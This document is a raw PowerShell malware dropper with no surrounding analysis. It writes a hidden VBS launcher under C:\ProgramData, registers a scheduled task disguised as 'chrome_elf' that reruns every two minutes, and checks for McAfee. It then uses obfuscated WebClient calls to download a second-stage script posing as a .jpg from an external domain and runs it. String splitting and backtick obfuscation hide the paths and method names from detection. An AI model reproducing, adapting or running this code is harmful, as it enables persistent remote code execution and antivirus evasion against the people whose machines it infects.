Function TRYX
{

start-sleep -s 2
[system.io.directory]::CreateDirectory("C:\ProgramData\WindowsHost\")
New-Item -Path C:\ProgramData\WindowsHost\sqmapi.vbs -ItemType File
start-sleep -s 1
Set-ItemProperty -Path C:\ProgramData\WindowsHost\sqmapi.vbs -Name IsReadOnly -Value $True
start-sleep -s 1
Add-Content -Path C:\ProgramData\WindowsHost\sqmapi.vbs -Value 'set A = CreateObject("WScript.Shell")' -Force
start-sleep -s 1
Add-Content -Path C:\ProgramData\WindowsHost\sqmapi.vbs -Value 'A.run "powershell -ExecutionPolicy Bypass & C"+":"+"\"+"U"+"s"+"e"+"r"+"s"+"\"+"P"+"u"+"b"+"l"+"i"+"c"+"\CorSym.ps1",0' -Force
start-sleep -s 1
Get-Content -Path C:\ProgramData\WindowsHost\sqmapi.vbs

start-sleep -s 3



$action = New-ScheduledTaskAction -Execute 'C:\ProgramData\WindowsHost\sqmapi.vbs'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "chrome_elf"

start-sleep -s 6


$DEV = 'C>><<<>><<<>>blic\'.Replace(">><<<>><<<>>",":\Users\Pu")
$mcAfee = "C:\Program Files\Common Files\McAfee\Platform\McUICnt.exe"

if([System.IO.File]::Exists($mcAfee)){

if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://www.escueladeteologiathetruehappiness.com/.NEW/.A.jpg', $DEV + 'CorSym.ps1')){
}

start-sleep -s 7
Start "C:\ProgramData\WindowsHost\sqmapi.vbs"
}

else{

if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://www.escueladeteologiathetruehappiness.com/.NEW/.B.jpg', $DEV + 'CorSym.ps1')){
}


start-sleep -s 7
Start "C:\ProgramData\WindowsHost\sqmapi.vbs"

}

}
IEX TRYX